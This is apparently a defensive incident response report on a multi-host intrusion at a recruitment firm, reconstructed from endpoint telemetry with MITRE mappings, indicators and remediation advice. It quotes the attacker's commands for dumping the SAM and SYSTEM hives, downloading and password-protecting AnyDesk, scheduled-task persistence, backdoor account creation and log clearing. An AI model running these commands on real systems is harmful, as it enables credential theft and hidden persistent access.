# Incident Response Report  
## The Broker — Multi-Host Intrusion Investigation

## Incident Overview

**Organization:** Ashford Sterling Recruitment  
**Telemetry Source:** Microsoft Defender for Endpoint  
**Incident Classification:** Payroll Fraud Attempt / Data Staging  
**Analyst:** Nikhil Pawar  
**Hunt Date:** February 23, 2026

---
## Executive Summary

This investigation analyzes a multi-stage intrusion within the **Ashford Sterling Recruitment** environment using telemetry from **Microsoft Defender for Endpoint**. Suspicious activity was first observed on workstation **AS-PC1**, where the user account **sophie.turner** executed a malicious file disguised as a document, providing the attacker with an initial foothold.

Following the compromise, the attacker established command-and-control communication and began performing interactive reconnaissance of the system and internal network. Credential material was extracted from the compromised host, enabling the attacker to move laterally from **AS-PC1** to **AS-PC2**, and subsequently to the server **AS-SRV** using valid credentials.

Once access to the server was obtained, the attacker accessed payroll-related files and other internal documents stored within shared directories. Multiple files were aggregated into a compressed archive, indicating preparation for potential **data exfiltration and payroll fraud activity**.

Before leaving the environment, the attacker deployed multiple persistence mechanisms, including remote access software, a scheduled task, and a backdoor administrative account. Event logs were also cleared and in-memory credential harvesting activity was observed, suggesting attempts to reduce forensic visibility and obtain additional credentials for future access.

Although sensitive data was staged during the intrusion, the available telemetry **did not confirm successful external data exfiltration** within the investigation window.

### Incident Scope

Analysis of available Microsoft Defender for Endpoint telemetry indicates that the intrusion involved **three systems within the Ashford Sterling Recruitment environment**: the workstations **AS-PC1** and **AS-PC2**, and the file server **AS-SRV**.  

The attacker gained interactive access through a compromised user account, later obtaining additional credentials that enabled lateral movement across the environment. Sensitive payroll and internal business documents stored on the server were accessed, and multiple files were aggregated into an archive indicating preparation for potential data exfiltration.  

While data staging activity was observed, the available telemetry did **not confirm successful external data transfer** during the investigation window.
 

---

## Environment Context

The investigation was conducted using **Microsoft Defender for Endpoint (MDE)** telemetry collected from systems within the Ashford Sterling Recruitment environment. The available telemetry begins after Defender onboarding was executed, meaning some attacker activity likely occurred prior to the first recorded events.

### Systems Involved

| System | Description |
|------|-------------|
| AS-PC1 | Initial workstation where suspicious activity was first observed |
| AS-PC2 | Secondary workstation later accessed by the attacker |
| AS-SRV | File server containing payroll and organizational documents |

### Accounts Observed During the Intrusion

| Account | Observed Activity |
|------|-------------|
| sophie.turner | Initial compromised user account |
| david.mitchell | Account leveraged during lateral movement |
| svc_backup | Service account created by the attacker to maintain persistence |

### Telemetry Availability

Defender telemetry for the environment begins at:

`2026-01-15T03:46:55Z`

This timestamp corresponds to the execution of the **Microsoft Defender onboarding script** on the host. Evidence suggests that malicious activity had already begun before telemetry collection started, meaning the **initial compromise vector is not visible in the available logs**.

The analysis therefore focuses on reconstructing attacker activity **from the earliest available telemetry onward**.

---

## Attack Flow Overview

| Phase | Description |
|------|-------------|
| Initial Access | A user executed a disguised payload on **AS-PC1** under the account **sophie.turner**, providing the attacker with an initial foothold. |
| Command and Control | Shortly after execution, the compromised host initiated outbound communication to an external infrastructure endpoint, indicating beaconing activity. |
| Discovery | The attacker performed manual system and network reconnaissance to identify accessible systems and resources. |
| Credential Access | Local credential stores were accessed, allowing the attacker to obtain additional authentication material. |
| Persistence | Remote access tooling and scheduled tasks were deployed to maintain continued access across compromised hosts. |
| Lateral Movement | Valid credentials were used to pivot from **AS-PC1** to **AS-PC2**, and later to the server **AS-SRV**. |
| Data Access | The attacker accessed payroll and internal organizational files stored on the server. |
| Data Staging | Multiple files were aggregated and archived in preparation for potential data exfiltration. |
| Defense Evasion | Cleanup actions were performed to reduce forensic evidence and obscure attacker activity. |

---

## Investigation Walkthrough

### Phase 1 — Initial Access

**Host:** AS-PC1  
**User:** sophie.turner  
**Initial Activity:** ~03:47Z (pre-telemetry execution inferred)

The investigation traced the initial compromise to a malicious executable disguised as a PDF file. The payload relied on a **double-extension masquerading technique (.pdf.exe)**, which can appear as a normal document when Windows hides known file extensions.

**Initial infection vector**

`daniel_richardson_cv.pdf.exe`

The file was launched through **explorer.exe**, indicating the payload was executed through **manual user interaction (double-click execution)**.

**Payload hash**

```
48b97fd91946e81e3e7742b3554585360551551cbf9398e1f34f4bc4eac3a6b5
```

After execution, the payload spawned a legitimate Windows process **notepad.exe**, suggesting the attacker used a benign process as a container to run malicious code.

**Observed command line**

```
notepad.exe ""
```
The empty argument indicates the process was launched without opening a file. This behavior is commonly associated with attackers spawning legitimate processes as containers for malicious code, a technique consistent with **process hollowing or other process injection methods**.

### MITRE ATT&CK Mapping

| Technique | Description |
|----------|-------------|
| T1204.002 | User Execution: Malicious File |
| T1036.007 | Masquerading: Double File Extension |
| T1055 | Process Injection |

---

### Phase 2 — Command & Control

**Timestamp:** 2026-01-15T03:47:10Z  
**Host:** AS-PC1  

Shortly after execution, the malicious payload initiated outbound communication with attacker-controlled infrastructure.

**Command & Control Domain**

```
cdn.cloud-endpoint.net
```

The rapid connection shortly after execution is consistent with **command-and-control beaconing**, allowing the compromised host to communicate with attacker infrastructure.

### Staging Infrastructure

Further investigation of command-line activity revealed the attacker using **certutil**, a legitimate Windows utility frequently abused to download additional payloads.

A secondary domain was identified hosting attacker-controlled content:

```
sync.cloud-endpoint.net
```

Telemetry shows the downloaded payload was saved locally as:

```
RuntimeBroker.exe
```

The filename mimics a legitimate Windows process, suggesting the attacker attempted to disguise the payload to blend with normal system activity.

### MITRE ATT&CK Mapping

| Technique | Description |
|----------|-------------|
| T1071.001 | Application Layer Protocol: Web Protocols |
| T1105 | Ingress Tool Transfer |
| T1036 | Masquerading |

---


### Phase 3 — Discovery

**Timestamp:** 03:58Z – 04:01Z  
**Host:** AS-PC1  

After establishing command and control, the attacker began performing **system and network reconnaissance** to understand the compromised environment and identify accessible resources.

Process telemetry shows a sequence of interactive commands executed through **cmd.exe**, consistent with manual attacker activity.

**Observed reconnaissance commands**

```
whoami.exe
hostname.exe
ipconfig.exe /all
net.exe user
net.exe localgroup administrators
net.exe view
```

These commands allowed the attacker to identify the current user context, gather host and network configuration details, enumerate local user accounts, identify administrative privileges, and discover accessible network resources. The sequential execution pattern indicates manual reconnaissance performed after the initial compromise.


### MITRE ATT&CK Mapping

| Technique | Description |
|----------|-------------|
| T1033 | System Owner/User Discovery |
| T1082 | System Information Discovery |
| T1016 | System Network Configuration Discovery |
| T1069.001 | Permission Groups Discovery: Local Groups |
| T1135 | Network Share Discovery |

---

### Phase 4 — Credential Access

**Timestamp:** 2026-01-15T04:13:32Z  
**Host:** AS-PC1  
**User:** sophie.turner  

Following reconnaissance activity, the attacker attempted to obtain credentials from the compromised host by exporting sensitive Windows registry hives containing credential material.

Process telemetry shows the use of the Windows utility **reg.exe** to copy both the **SAM** and **SYSTEM** registry hives to the publicly accessible directory `C:\Users\Public\`

**Observed commands**

```
reg.exe save HKLM\SAM C:\Users\Public\sam.hiv
reg.exe save HKLM\SYSTEM C:\Users\Public\system.hiv
```

Exporting both the **SAM** and **SYSTEM** hives allows an attacker to recover local account password hashes offline.  

Telemetry confirms that these actions were executed under the user context `sophie.turner`

### MITRE ATT&CK Mapping

| Technique | Description |
|----------|-------------|
| T1003.002 | OS Credential Dumping: Security Account Manager |

---

### Phase 5 — Persistence: Remote Access Tool

**Timestamp:** 04:03Z – 04:11Z  
**Host:** AS-PC1 (later observed on AS-PC2 and AS-SRV)

The attacker deployed a legitimate remote administration tool to maintain persistent access within the environment. Process telemetry shows the Windows utility **certutil.exe** being used to download the AnyDesk binary from the official distribution server and save it locally.

**Observed download command**

```
certutil -urlcache -split -f https://download.anydesk.com/AnyDesk.exe C:\Users\Public\AnyDesk.exe
```

SHA256 hash of the downloaded binary **AnyDesk.exe**:

```
f42b635d93720d1624c74121b83794d706d4d064bee027650698025703d20532
```

After installation, unattended remote access was configured through the AnyDesk command-line interface. The attacker set the access password to **`intrud3r!`** using the following command:

```
cmd.exe /c "echo intrud3r! | C:\Users\Public\AnyDesk.exe --set-password"
```

Shortly afterward, the AnyDesk configuration file was accessed at  
**`C:\Users\Sophie.Turner\AppData\Roaming\AnyDesk\system.conf`**, confirming that the tool was successfully configured for remote access.

Further telemetry across the environment shows AnyDesk activity on multiple systems, indicating the tool was deployed beyond the initial host. Execution was observed on **as-pc1, as-pc2, and as-srv**, establishing persistent remote administration access across several machines.

**MITRE ATT&CK Mapping**

| Technique | Description |
|-----------|-------------|
| T1219 | Remote Access Software |
| T1105 | Ingress Tool Transfer |


---


### Phase 6 — Lateral Movement

**Timestamp:** 04:20Z – 04:40Z  
**Source Host:** AS-PC1

After establishing persistence on AS-PC1, the attacker attempted to move laterally within the environment. Process telemetry shows several remote execution attempts targeting another workstation before a successful pivot was achieved.

### Initial Attempts (Failed)

**Target Host:** AS-PC2

Process activity on AS-PC1 shows the attacker attempting remote command execution using two administrative utilities:

```
WMIC.exe
PsExec.exe
```

Both tools attempted to execute commands remotely against **AS-PC2**, but no corresponding execution telemetry was observed on the destination host, indicating that these attempts were unsuccessful.

### Successful Pivot via RDP

Following the failed remote execution attempts, the attacker switched to an interactive remote desktop session using the Windows Remote Desktop client.

```
mstsc.exe /v:10.1.0.183
```

Network and process telemetry show that this connection successfully authenticated to **AS-PC2** using the account **`david.mitchell`**.

This aligns with the earlier credential extraction activity, indicating that the attacker leveraged recovered credentials to gain interactive access to the second host.

### Lateral Movement Path

Based on network telemetry and subsequent activity across endpoints, the attacker moved through the environment in the following sequence: `as-pc1 > as-pc2 > as-srv`

### Account Manipulation

After establishing access, the attacker modified account settings on the compromised system. Process telemetry shows **net.exe** being used to enable the built-in Administrator account:

```
net.exe user Administrator /active:yes
```

This command was executed under the user context **`david.mitchell`**, confirming that the compromised credentials were used to perform the account activation.

### MITRE ATT&CK Mapping

| Technique | Description |
|-----------|-------------|
| T1047 | Windows Management Instrumentation |
| T1021.002 | Remote Services: SMB/Windows Admin Shares |
| T1021.001 | Remote Services: Remote Desktop Protocol |
| T1098 | Account Manipulation |


---


### Phase 7 — Data Access

**Timestamp:** 04:42Z – 04:46Z  
**Source Host:** AS-PC2  
**Target Host:** AS-SRV  

After moving laterally into the environment, the attacker accessed a sensitive payroll document stored on the file server. File telemetry on **AS-SRV** shows activity involving the following document:

**Sensitive document**

```
BACS_Payments_Dec2025.ods
```

The file was located under the payroll share on the server, and additional file activity shows that it was not merely viewed. A LibreOffice lock artifact was created during access, which is consistent with the document being opened for editing.

**Modification artifact**

```
.~lock.BACS_Payments_Dec2025.ods#
```

Device logon telemetry on **AS-SRV** around the same time shows repeated network logons originating from **AS-PC2**, indicating that this workstation was the source of access to the payroll file.

**Access origin**

```
as-pc2
```

Taken together, the file events and correlated network logons indicate that the attacker accessed and modified a payroll-related document on the server after pivoting from **AS-PC2**.

**MITRE ATT&CK Mapping**

| Technique | Description |
|-----------|-------------|
| T1021.002 | Remote Services: SMB/Windows Admin Shares |


---

### Phase 8 — Persistence: Scheduled Task and Backdoor Account

**Timestamp:** 04:52Z – 04:57Z  
**Hosts:** AS-PC2, AS-SRV, AS-PC1  

After gaining access to additional systems, the attacker established further persistence by creating a scheduled task tied to a renamed payload and by creating a new local backdoor account.

**Scheduled task creation**

```
schtasks.exe /create /tn MicrosoftEdgeUpdateCheck /tr C:\Users\Public\RuntimeBroker.exe /sc daily /st 03:00 /rl highest /f
```

**Scheduled Task Name**: `MicrosoftEdgeUpdateCheck`

**Persistence Payload**: `RuntimeBroker.exe`

This payload matches the binary previously downloaded from the staging infrastructure in **Phase 2 — Command & Control**. File telemetry shows that `RuntimeBroker.exe` shares the same SHA256 hash as the original malicious payload, confirming the attacker reused the same binary under a renamed filename.

**SHA256 Hash**

```
48b97fd91946e81e3e7742b3554585360551551cbf9398e1f34f4bc4eac3a6b5
```

The filename was chosen to resemble a legitimate Windows process, helping the persistence mechanism blend into normal host activity.

The attacker also created a new local account and added it to the Administrators group:

```
net user svc_backup ******** /add
net localgroup Administrators svc_backup /add
```

**Backdoor Account**: `svc_backup`

Together, these actions gave the attacker additional persistence beyond AnyDesk, increasing the likelihood of continued access if one mechanism was removed.

### MITRE ATT&CK Mapping

| Technique | Description |
|-----------|-------------|
| T1053.005 | Scheduled Task / Job: Scheduled Task |
| T1136.001 | Create Account: Local Account |
| T1098 | Account Manipulation |
| T1036 | Masquerading |

---


### Phase 9 — Data Staging

**Timestamp:** 04:59:04Z – 04:59:47Z  
**Host:** AS-SRV  
**Account:** as.srv.administrator  

After accessing sensitive data and establishing persistence, the attacker staged data for potential exfiltration by creating a compressed archive on the file server.

Process telemetry shows the attacker executing the 7-Zip GUI binary:

```
"7zG.exe" a -i#7zMap308:22:7zEvent6071 -t7z -sae -- "C:\Shares.7z"
```

**Archive Filename**: `Shares.7z`

**SHA256 Hash**

```
6886c0a2e59792e69df94d2cf6ae62c2364fda50a23ab44317548895020ab048
```

File event telemetry shows the archive was **created on AS-SRV** at:

```
C:\Shares.7z
```

Shortly after creation, the file was **moved into the shared directory structure**:

```
C:\Shares\Clients\Shares.7z
```

Staging data in an archive within the shared folder structure may allow the attacker to retrieve it later through SMB access without generating immediate outbound transfer activity.

### MITRE ATT&CK Mapping

| Technique | Description |
|-----------|-------------|
| T1074.001 | Data Staged: Local Data Staging |
| T1560.001 | Archive Collected Data |

---

### Phase 10 — Anti-Forensics and In-Memory Credential Theft

**Timestamp:** 05:07:31Z – 05:10:08Z  
**Host:** AS-SRV  

Following data staging, the attacker attempted to remove forensic evidence and harvest additional credentials before leaving the environment.

### Log Clearing

Process telemetry shows the attacker clearing Windows event logs using `wevtutil.exe`. Two of the logs cleared include:

```
Security
System
```

Clearing event logs is a common anti-forensics technique used to remove evidence of malicious activity and hinder incident response investigations.

### Reflective Code Loading

Defender telemetry recorded the following ActionType:

```
ClrUnbackedModuleLoaded
```

This indicates a .NET assembly was loaded directly into memory without a corresponding file on disk, which is a typical indicator of reflective loading used by in-memory attack tools.

### Credential Theft Tool

Further telemetry identified the credential harvesting tool:

```
SharpChrome
```

SharpChrome is commonly used to extract saved credentials from Chromium-based browsers by leveraging the Windows DPAPI credential store.

### Host Process

The malicious assembly was loaded inside the following legitimate process:

```
notepad.exe
```

Using a trusted Windows process as a host allows attackers to blend malicious activity with legitimate system behavior and reduce the likelihood of detection.

### MITRE ATT&CK Mapping

| Technique | Description |
|-----------|-------------|
| T1070.001 | Indicator Removal: Clear Windows Event Logs |
| T1055 | Process Injection |
| T1003 | OS Credential Dumping |
| T1620 | Reflective Code Loading |

---

# Indicators of Compromise

### Malicious File Artifacts

| Filename | SHA256 | Description |
|---|---|---|
| daniel_richardson_cv.pdf.exe | `48b97fd91946e81e3e7742b3554585360551551cbf9398e1f34f4bc4eac3a6b5` | Initial malicious payload delivered via phishing attachment |
| RuntimeBroker.exe | `48b97fd91946e81e3e7742b3554585360551551cbf9398e1f34f4bc4eac3a6b5` | Renamed persistence payload (same binary reused) |
| AnyDesk.exe | `f42b635d93720d1624c74121b83794d706d4d064bee027650698025703d20532` | Remote access tool installed by attacker |
| Shares.7z | `6886c0a2e59792e69df94d2cf6ae62c2364fda50a23ab44317548895020ab048` | Archive created to stage collected data |

---

### Command and Control Infrastructure

| Indicator | Type | Purpose |
|---|---|---|
| cdn.cloud-endpoint.net | Domain | Command and control communication |
| sync.cloud-endpoint.net | Domain | Payload staging server |

---

### Persistence Artifacts

| Artifact | Value | Description |
|---|---|---|
| Local Account | svc_backup | Backdoor administrative account created by attacker |
| Scheduled Task | MicrosoftEdgeUpdateCheck | Scheduled task executing persistence payload |
| Persistence Binary | C:\Users\Public\RuntimeBroker.exe | Renamed payload used for scheduled execution |

---

### Notable File Paths for Threat Hunting

```
C:\Users\Public\AnyDesk.exe
C:\Users\Public\RuntimeBroker.exe
C:\Users\Public\sam.hiv
C:\Users\Public\system.hiv
C:\Users\Sophie.Turner\AppData\Roaming\AnyDesk\system.conf
C:\Shares.7z
C:\Shares\Clients\Shares.7z
```

These file locations represent artifacts observed during the intrusion and can be used for retrospective threat hunting across the environment.

---

# MITRE ATT&CK Summary

| Tactic | Technique | ID |
|------|------|------|
| Initial Access | User Execution: Malicious File | T1204.002 |
| Defense Evasion | Masquerading: Double File Extension | T1036.007 |
| Execution | Process Injection | T1055 |
| Command and Control | Application Layer Protocol: Web Protocols | T1071.001 |
| Command and Control | Ingress Tool Transfer | T1105 |
| Discovery | System Owner/User Discovery | T1033 |
| Discovery | System Information Discovery | T1082 |
| Discovery | System Network Configuration Discovery | T1016 |
| Discovery | Permission Groups Discovery: Local Groups | T1069.001 |
| Discovery | Network Share Discovery | T1135 |
| Credential Access | OS Credential Dumping: Security Account Manager | T1003.002 |
| Credential Access | OS Credential Dumping | T1003 |
| Persistence | Remote Access Software | T1219 |
| Persistence | Scheduled Task/Job: Scheduled Task | T1053.005 |
| Persistence | Create Account: Local Account | T1136.001 |
| Persistence | Account Manipulation | T1098 |
| Lateral Movement | Remote Services: Remote Desktop Protocol | T1021.001 |
| Lateral Movement | Windows Management Instrumentation | T1047 |
| Collection | Data Staged: Local Data Staging | T1074.001 |
| Collection | Archive Collected Data | T1560.001 |
| Defense Evasion | Indicator Removal: Clear Windows Event Logs | T1070.001 |
| Defense Evasion | Reflective Code Loading | T1620 |


---


---

# Key Findings

The investigation identified a multi-stage intrusion affecting multiple systems within the Ashford Sterling Recruitment environment. Analysis of Microsoft Defender for Endpoint telemetry revealed that the attacker gained interactive access to workstation **AS-PC1** under the user account **sophie.turner**, likely through execution of a disguised malicious attachment.

Following the initial compromise, the attacker established communication with external infrastructure and began performing manual reconnaissance of the compromised system and internal network. During this phase, the attacker enumerated system information, user accounts, and accessible network resources.

Credential material was then extracted from the compromised system through the export of the **SAM** and **SYSTEM** registry hives. This activity likely enabled the attacker to obtain additional credentials used later in the intrusion.

Using valid credentials, the attacker moved laterally from **AS-PC1** to **AS-PC2**, and subsequently to the server **AS-SRV** using Remote Desktop Protocol. After gaining access to the server, the attacker accessed payroll-related documents stored within shared directories.

Multiple persistence mechanisms were deployed during the intrusion, including the installation of **AnyDesk** remote administration software, the creation of a scheduled task executing a renamed payload, and the creation of a new administrative account **svc_backup**.

Before leaving the environment, the attacker staged collected data into an archive file **Shares.7z** on the server, indicating preparation for possible data exfiltration. Event logs were subsequently cleared and in-memory credential harvesting activity was detected, suggesting attempts to remove forensic evidence and obtain additional credentials.

Although sensitive files were accessed and staged, the available telemetry did **not confirm successful external data exfiltration** during the observed timeframe.

---

# Containment and Remediation Recommendations

Based on the findings of this investigation, the following actions are recommended to contain the incident and strengthen the security posture of the environment.

### Immediate Containment Actions

- **Isolate affected systems**  
  Immediately isolate **AS-PC1**, **AS-PC2**, and **AS-SRV** from the network to prevent further attacker activity.

- **Disable compromised accounts**  
  Temporarily disable or reset credentials for the following accounts:
  - `sophie.turner`
  - `david.mitchell`
  - `svc_backup`
  - Local `Administrator` accounts on affected systems

- **Remove persistence mechanisms**  
  - Delete the scheduled task **MicrosoftEdgeUpdateCheck**
  - Remove the unauthorized account **svc_backup**
  - Uninstall **AnyDesk** from all affected hosts

- **Preserve forensic evidence**  
  Acquire forensic images and preserve log data from affected systems prior to performing full remediation.

---

### Remediation Actions

- **Reset credentials environment-wide**  
  Perform forced password resets for all users and privileged accounts, especially administrative accounts.

- **Rebuild compromised systems**  
  Consider rebuilding affected endpoints and servers from known clean images to ensure complete removal of attacker artifacts.

- **Audit privileged account usage**  
  Review usage of local and domain administrative accounts and restrict privileges according to the principle of least privilege.

- **Review network access controls**  
  Restrict RDP access between internal systems and require additional authentication controls such as network-level authentication and multi-factor authentication.

- **Improve endpoint monitoring**  
  Ensure that Microsoft Defender for Endpoint is fully deployed and telemetry collection is functioning across all systems to provide visibility into future attacks.

- **Monitor for known indicators of compromise**  
  Conduct retrospective threat hunting across the environment for the identified file hashes, domains, scheduled tasks, and suspicious account activity listed in the **Indicators of Compromise** section.

---

### Security Hardening Recommendations

To reduce the likelihood of similar attacks in the future, the organization should consider implementing the following security controls:

- Enforce **multi-factor authentication (MFA)** for remote access and privileged accounts
- Restrict execution of files from user download directories where possible
- Implement **application allow-listing** to prevent unauthorized software execution
- Limit installation of remote administration tools
- Implement centralized logging and SIEM monitoring for faster incident detection
- Conduct regular **security awareness training** to reduce the risk of phishing-based attacks
